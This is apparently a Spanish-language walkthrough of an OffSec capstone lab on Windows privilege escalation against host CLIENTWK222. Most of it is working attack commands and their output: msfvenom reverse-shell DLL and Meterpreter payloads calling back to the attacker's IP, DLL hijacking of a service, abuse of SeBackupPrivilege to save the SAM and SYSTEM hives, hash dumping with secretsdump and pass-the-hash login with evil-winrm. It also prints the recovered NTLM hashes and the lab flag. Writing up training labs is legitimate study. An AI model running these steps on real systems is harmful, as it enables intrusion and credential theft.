# Walk: Windows Privilege Escalation - VM #3  

## Fecha: {FECHA}
## Host: Windows
## IP: 192.168.xxx.222
## Objetivo
Capstone Lab: Get access to CLIENTWK222 (VM #3) by connecting to the bind shell on port 4444. 
Use the methods covered in this Module to elevate your privileges to an administrative user. 
Enter the flag, which is located in C:\Users\enterpriseadmin\Desktop\flag.txt.

## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeracion
```bash
PS C:\Users\diana> Get-Process | Select Name, Id                                                                                                                                                                  
Get-Process | Select Name, Id                                                                                                                                                                                     
                                                                                                                                                                                                                  
Name                    Id                                                                                                                                                                                        
----                    --                                                                                                                                                                                        
AggregatorHost        3528
cmd                   1248
conhost               5744
conhost               6476
csrss                  460
csrss                  568
dllhost               3616
dllhost               3772
dwm                    392
EnterpriseService     2940 <-- Posible proceso custom vulnerable
fontdrvhost            828
fontdrvhost            832
Idle                     0
LogonUI               4296
lsass                  700
Memory Compression    2112
MicrosoftEdgeUpdate   5616
MpDefenderCoreService 2836
msdtc                 3856
MsMpEng               3036
nc                    1284
powershell            1712
powershell            2968
powershell            4660
Registry               100
SearchIndexer         5636
SearchProtocolHost    5580
SecurityHealthService 6676
services               668
SgrmBroker            4628
smss                   368
svchost                696
... todos los procesos svchost...
svchost               6216
System                   4
VGAuthService         2972
vm3dservice           2980
vm3dservice           3236
vm3dservice           4364
vmtoolsd              2996
wininit                552
winlogon               648
WmiPrvSE              3868


PS C:\Users\diana> Get-Process -Id 2940 | Format-List *
Get-Process -Id 2940 | Format-List *                                                                                                                                                                              
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Name                       : EnterpriseService                                                                                                                                                                    
Id                         : 2940
PriorityClass              : 
FileVersion                : 
HandleCount                : 58
WorkingSet                 : 3584000
PagedMemorySize            : 753664
PrivateMemorySize          : 753664
VirtualMemorySize          : -1
TotalProcessorTime         : 
SI                         : 0
Handles                    : 58
VM                         : 4294967295
WS                         : 3584000
PM                         : 753664
NPM                        : 5360
Path                       : 
Company                    : 
CPU                        : 
ProductVersion             : 
Description                : 
Product                    : 
__NounName                 : Process
BasePriority               : 8
ExitCode                   : 
HasExited                  : 
ExitTime                   : 
Handle                     : 
SafeHandle                 : 
MachineName                : .
MainWindowHandle           : 0
MainWindowTitle            : 
MainModule                 : 
MaxWorkingSet              : 
MinWorkingSet              : 
Modules                    : 
NonpagedSystemMemorySize   : 5360
NonpagedSystemMemorySize64 : 5360
PagedMemorySize64          : 753664
PagedSystemMemorySize      : 31952
PagedSystemMemorySize64    : 31952
PeakPagedMemorySize        : 843776
PeakPagedMemorySize64      : 843776
PeakWorkingSet             : 3706880
PeakWorkingSet64           : 3706880
PeakVirtualMemorySize      : -1
PeakVirtualMemorySize64    : 4294967295
PriorityBoostEnabled       : 
PrivateMemorySize64        : 753664
PrivilegedProcessorTime    : 
ProcessName                : EnterpriseService
ProcessorAffinity          : 
Responding                 : True
SessionId                  : 0
StartInfo                  : System.Diagnostics.ProcessStartInfo
StartTime                  : 
SynchronizingObject        : 
Threads                    : {2944, 3060}
UserProcessorTime          : 
VirtualMemorySize64        : 4294967295
EnableRaisingEvents        : False
StandardInput              : 
StandardOutput             : 
StandardError              : 
WorkingSet64               : 3584000
Site                       : 
Container                  : 

PS C:\Users\diana>
PS C:\Users\diana> $acl = Get-Acl "C:\Services\EnterpriseService.exe"     
$acl = Get-Acl "C:\Services\EnterpriseService.exe"
PS C:\Users\diana> $acl.Access | Format-Table IdentityReference, FileSystemRights, AccessControlType
$acl.Access | Format-Table IdentityReference, FileSystemRights, AccessControlType

IdentityReference                 FileSystemRights AccessControlType
-----------------                 ---------------- -----------------
NT AUTHORITY\SYSTEM                    FullControl             Allow
BUILTIN\Administrators                 FullControl             Allow
BUILTIN\Users          ReadAndExecute, Synchronize             Allow


PS C:\Users\diana>  
```
#### Paso 2: Leer archivos en documents:
```bash
PS C:\Users\diana\Documents> iwr -uri http://192.168.45.213:8000/loot.ps1 -Outfile loot.ps1
iwr -uri http://192.168.45.213:8000/loot.ps1 -Outfile loot.ps1
PS C:\Users\diana\Documents> powershell -ep bypass -f .\loot.ps1
powershell -ep bypass -f .\loot.ps1

=============================
Archivo: C:\Users\diana\Documents\note1.txt
=============================
Passwordless????? Zero trust????????

=============================
Archivo: C:\Users\diana\Documents\note10.txt
=============================
Fearless transparent nothing to hide. Check

=============================
Archivo: C:\Users\diana\Documents\note11.txt
=============================
microchip shortage - call DevOps/IT?

=============================
Archivo: C:\Users\diana\Documents\note12.txt
=============================
Get rental confirmation receipt from Handy

=============================
Archivo: C:\Users\diana\Documents\note13.txt
=============================
Where are provisioning scripts stored? Passwords should be hashed on them???

=============================
Archivo: C:\Users\diana\Documents\note14.txt
=============================
MS.17 010? MS 08-067? Phase out XP OT boxes within the year.

=============================
Archivo: C:\Users\diana\Documents\note15.txt
=============================
Board wants us to change all passwords every 10 days for security? Roll out by end of Q2

=============================
Archivo: C:\Users\diana\Documents\note16.txt
=============================
TODO: remove certutil.exe - being used by APTs (NGOs??)

=============================
Archivo: C:\Users\diana\Documents\note17.txt
=============================
15.20 for lunch, my split, burgr from intern jim - maybe payroll/hr ask them

=============================
Archivo: C:\Users\diana\Documents\note18.txt
=============================
who's responsible for Jenkins? ask Alex after holiday

=============================
Archivo: C:\Users\diana\Documents\note19.txt
=============================
IN PROGRESS: move all internal backup services to not run as SYSTEM

=============================
Archivo: C:\Users\diana\Documents\note2.txt
=============================
Default password for new resets will be WelcomeToWinter0121

=============================
Archivo: C:\Users\diana\Documents\note20.txt
=============================
Alex's password expired, but he's on holiday for the next 4 weeks. Password reset by IT to the default

=============================
Archivo: C:\Users\diana\Documents\note21.txt
=============================
PTO being phased out - HR being replaced with SaaS?

=============================
Archivo: C:\Users\diana\Documents\note22.txt
=============================

=============================
Archivo: C:\Users\diana\Documents\note3.txt
=============================
new directive: Security team is being outsourced end of Q3. Look on freelancer?

=============================
Archivo: C:\Users\diana\Documents\note4.txt
=============================
"In the midst of chaos, there is also opportunity." - Sun Tzu. look this up

=============================
Archivo: C:\Users\diana\Documents\note5.txt
=============================
remember to bring PDFs to the board meeting

=============================
Archivo: C:\Users\diana\Documents\note6.txt
=============================
security are mentioning domain administrator (??) compromise - look into it next week

=============================
Archivo: C:\Users\diana\Documents\note7.txt
=============================
Apparently they have SSH for Windows now? Remove netcat hack when ssh is working

=============================
Archivo: C:\Users\diana\Documents\note8.txt
=============================
Fall (autumn?), Winter, end of the year - Accounts???

=============================
Archivo: C:\Users\diana\Documents\note9.txt
=============================
Point by point refutation statements
PS C:\Users\diana\Documents>
```
> Note2 : WelcomeToWinter0121 

```
C:\Services>type EnterpriseServiceLog.log
type EnterpriseServiceLog.log
[00:00:00.000] (bf4) WARN   Couldn't load EnterpriseServiceOptional.dll, only using basic features.
```
- Revisamos permisos de escritura con ambos usuarios **diana** y **alex** en el directorio **C:\Services**


1. Generamos con msfvenom una dll con ese nombre en el puerto 9999:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/17-WindowsPrivilegeEscalation/Capstones]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=9999 -f dll > EnterpriseServiceOptional.dll
```
2. Utilizamos la sesion de evil-winrm de **alex** para subir a **C:\Services** la dll
```bash
*Evil-WinRM* PS C:\Users\alex\Documents>iwr -uri http://<MY_IP>:8000/EnterpriseServiceOptional.dll -OutFile C:\Services\EnterpriseServiceOptional.dll
```
3. Iniciamos con RDP sesion como alex y buscamos con Win + R **"services.msc"** y buscamos en la herramienta los servicios asociados a **EnterpriseService**
> Con el receptor nc escuchando en el puerto 9999 reiniciamos el proceso **EnterpriseServiceChecks** y Obtenemos un shel como enterpriseuser.

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 9999                                                 
listening on [any] 9999 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.129.222] 54375
Microsoft Windows [Version 10.0.22000.978]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
clientwk222\enterpriseuser

C:\Users\enterpriseuser\Documents>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeBackupPrivilege             Back up files and directories             Enabled # posible target
SeRestorePrivilege            Restore files and directories             Enabled
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled # Spooler desactivado y sin permisos para activarlo.
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled

C:\Users\enterpriseuser\Documents>

```
- Para mas comodidad obtenemos un meterpreter.. 

1. Generamos el backdoor y lo servimos con python:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/17-WindowsPrivilegeEscalation/Capstones]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.213 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/17-WindowsPrivilegeEscalation/Capstones]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.129.222 - - [29/Jun/2025 21:16:49] "GET /met.exe HTTP/1.1" 200 -
```

2. Configuracion de MSF:
> Iniciar msfconsolo como **root** para posterior descarga de archivos.
```bash
msf6 > workspace 17-Capstone 
[*] Workspace: 17-Capstone
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.45.213
LHOST => 192.168.45.213
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.45.213:443 
msf6 exploit(multi/handler) > [*] Sending stage (203846 bytes) to 192.168.129.222
[*] Meterpreter session 1 opened (192.168.45.213:443 -> 192.168.129.222:55846) at 2025-06-29 21:17:13 -0300
sessions

Active sessions
===============

  Id  Name  Type                     Information                               Connection
  --  ----  ----                     -----------                               ----------
  1         meterpreter x64/windows  CLIENTWK222\enterpriseuser @ CLIENTWK222  192.168.45.213:443 -> 192.168.129.222:55846 (192.168.129.222)

msf6 exploit(multi/handler) > 

```
3. Solicitamos el archivo desde **diana** ylo ejecutamos desde **enterpriseuser**

> diana
```bash
PS C:\Windows\Temp> cd C:\Services                    
cd C:\Services                                                     
PS C:\Services> iwr -uri http://192.168.45.213:8000/met.exe -Outfile met.exe                                                           
iwr -uri http://192.168.45.213:8000/met.exe -Outfile met.exe       
PS C:\Services> 
```
> enterpriseuser
```bash
C:\Services>.\met.exe                                                                                                                      
.\met.exe                                                                                                                                  
```

* Explotacion del privilegio **SeBackupPrivilege**

```bash
C:\>mkdir Temp
mkdir Temp

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C77-2F5D

 Directory of C:\

06/30/2025  07:31 AM             2,638 output.txt
06/05/2021  05:10 AM    <DIR>          PerfLogs
12/07/2022  10:00 PM    <DIR>          Program Files
06/05/2021  07:37 AM    <DIR>          Program Files (x86)
06/30/2025  07:41 AM    <DIR>          Services
06/30/2025  07:57 AM    <DIR>          Temp
06/30/2025  07:29 AM    <DIR>          Users
06/30/2025  07:29 AM    <DIR>          Windows
               1 File(s)          2,638 bytes
               7 Dir(s)   4,788,191,232 bytes free

C:\>reg save HKLM\SAM C:\Temp\SAM.bak                                                      
reg save HKLM\SAM C:\Temp\SAM.bak
The operation completed successfully.

C:\>reg save HKLM\SYSTEM C:\Temp\SYSTEM.bak
reg save HKLM\SYSTEM C:\Temp\SYSTEM.bak
The operation completed successfully.

C:\>cd Temp
cd Temp

C:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C77-2F5D

 Directory of C:\Temp

06/30/2025  08:00 AM    <DIR>          .
06/30/2025  07:58 AM            65,536 SAM.bak
06/30/2025  08:00 AM        12,476,416 SYSTEM.bak
               2 File(s)     12,541,952 bytes
               1 Dir(s)   4,775,452,672 bytes free

C:\Temp>^Z
Background channel 1? [y/N]  y
meterpreter > pwd
C:\Users
meterpreter > cd ..
meterpreter > cd Temp
meterpreter > dir
Listing: C:\Temp
================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  65536     fil   2025-06-30 11:58:41 -0300  SAM.bak
100666/rw-rw-rw-  12476416  fil   2025-06-30 12:00:04 -0300  SYSTEM.bak

meterpreter > download SAM.bak
[*] Downloading: SAM.bak -> /home/kali/SAM.bak
[*] Downloaded 64.00 KiB of 64.00 KiB (100.0%): SAM.bak -> /home/kali/SAM.bak
[*] Completed  : SAM.bak -> /home/kali/SAM.bak
meterpreter > download SYSTEM.bak
[*] Downloading: SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 1.00 MiB of 11.90 MiB (8.4%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 2.00 MiB of 11.90 MiB (16.81%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 3.00 MiB of 11.90 MiB (25.21%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 4.00 MiB of 11.90 MiB (33.62%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 5.00 MiB of 11.90 MiB (42.02%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 6.00 MiB of 11.90 MiB (50.43%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 7.00 MiB of 11.90 MiB (58.83%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 8.00 MiB of 11.90 MiB (67.24%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 9.00 MiB of 11.90 MiB (75.64%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 10.00 MiB of 11.90 MiB (84.04%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 11.00 MiB of 11.90 MiB (92.45%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Downloaded 11.90 MiB of 11.90 MiB (100.0%): SYSTEM.bak -> /home/kali/SYSTEM.bak
[*] Completed  : SYSTEM.bak -> /home/kali/SYSTEM.bak
meterpreter >
```
#### Dumpear los archivos backup y obtenemos el flag

```bash
┌──(root㉿kali)-[/home/kali/OffSec/17-WindowsPrivilegeEscalation/Capstones]
└─# impacket-secretsdump -sam SAM.bak -system SYSTEM.bak LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xb4999e49259682622dcc1e3a1636ff45
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:856f13362db36284f7d964120d794a98:::
enterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::
diana:1002:aad3b435b51404eeaad3b435b51404ee:3f2e7dddbe7a42d8978c1689b67297f3:::
alex:1003:aad3b435b51404eeaad3b435b51404ee:821036ef8b6f43194779f6fca426f3f7:::
enterpriseuser:1004:aad3b435b51404eeaad3b435b51404ee:b875ee792421982ebcfa8217340ef376:::
offsec:1005:aad3b435b51404eeaad3b435b51404ee:d2ce08a1ee362158863d47d478b2622e:::
[*] Cleaning up...

┌──(root㉿kali)-[/home/kali]
└─# evil-winrm -i 192.168.129.222 -u 'Administrator' -H "8f518eb35353d7a83d27e7fe457664e5" -P 5985  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/1/2023   5:51 AM                Administrator
d-----         9/16/2022  11:25 AM                alex
d-----         9/16/2022  11:04 AM                diana
d-----         9/16/2022   9:37 AM                enterpriseadmin
d-----         9/16/2022  11:04 AM                enterpriseuser
d-----         6/30/2025   7:29 AM                offsec
d-r---         9/15/2022  10:04 PM                Public


*Evil-WinRM* PS C:\Users> cd enterpriseadmin/Desktop
*Evil-WinRM* PS C:\Users\enterpriseadmin\Desktop> dir


    Directory: C:\Users\enterpriseadmin\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/30/2025   7:29 AM             38 flag.txt
-a----         9/15/2022  10:04 PM           2350 Microsoft Edge.lnk


*Evil-WinRM* PS C:\Users\enterpriseadmin\Desktop> type flag.txt
OS{68c2b863a64760f812c058dd08b7cf8d}
*Evil-WinRM* PS C:\Users\enterpriseadmin\Desktop> 
```
